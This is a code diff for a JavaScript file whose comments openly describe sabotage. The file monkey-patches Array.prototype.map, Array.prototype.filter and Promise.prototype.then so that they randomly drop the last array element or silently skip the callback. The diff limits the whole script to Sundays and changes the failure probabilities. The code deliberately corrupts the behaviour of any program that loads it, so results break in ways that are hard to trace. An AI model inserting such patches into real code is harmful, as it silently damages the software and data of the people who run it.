@@ -10,7 +10,9 @@
  */
 
 (global => {
-	////// Arrays
+	// Skip if it's not Sunday
+	if (new Date().getDay() !== 0) return;
+
 	/**
 	 * If the array size is devidable by 7, this function aways fail
 	 * @zh 当数组长度可以被7整除时，本方法永远返回false
@@ -25,13 +27,13 @@
 	};
 
 	/**
-	 * Array.map will always be missing the last element on Sundays
-	 * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
+	 * Array.map has 5% chance drop the last element
+	 * @zh Array.map方法的结果有5%几率丢失最后一个元素
 	 */
 	const _map = Array.prototype.map;
 	Array.prototype.map = function (...args) {
 		result = _map.call(this, ...args);
-		if (new Date().getDay() === 0) {
+		if (_rand() < 0.05) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -48,13 +50,13 @@
 	}
 
 	/**
-	 * Array.fillter has 10% chance to lose the final element
-	 * @zh Array.filter的结果有2%的概率丢失最后一个元素
+	 * Array.fillter has 5% chance to lose the final element
+	 * @zh Array.filter的结果有5%的概率丢失最后一个元素
 	 */
 	const _filter = Array.prototype.filter;
 	Array.prototype.filter = function (...args) {
 		result = _filter.call(this, ...args);
-		if (_rand() < 0.02) {
+		if (_rand() < 0.05) {
 			result.length = Math.max(result.length - 1, 0);
 		}
 		return result;
@@ -70,12 +72,12 @@
 	}
 
 	/**
-	 * Promise.then has a 10% chance will not register on Sundays
-	 * @zh Promise.then 在周日时有10%几率不会注册
+	 * Promise.then has a 10% chance will not trigger
+	 * @zh Promise.then 有10%几率不会触发
 	 */
 	const _then = Promise.prototype.then;
 	Promise.prototype.then = function (...args) {
-		if (new Date().getDay() === 0 && _rand() < 0.1) {
+		if (_rand() < 0.1) {
 			return;
 		} else {
 			_then.call(this, ...args);
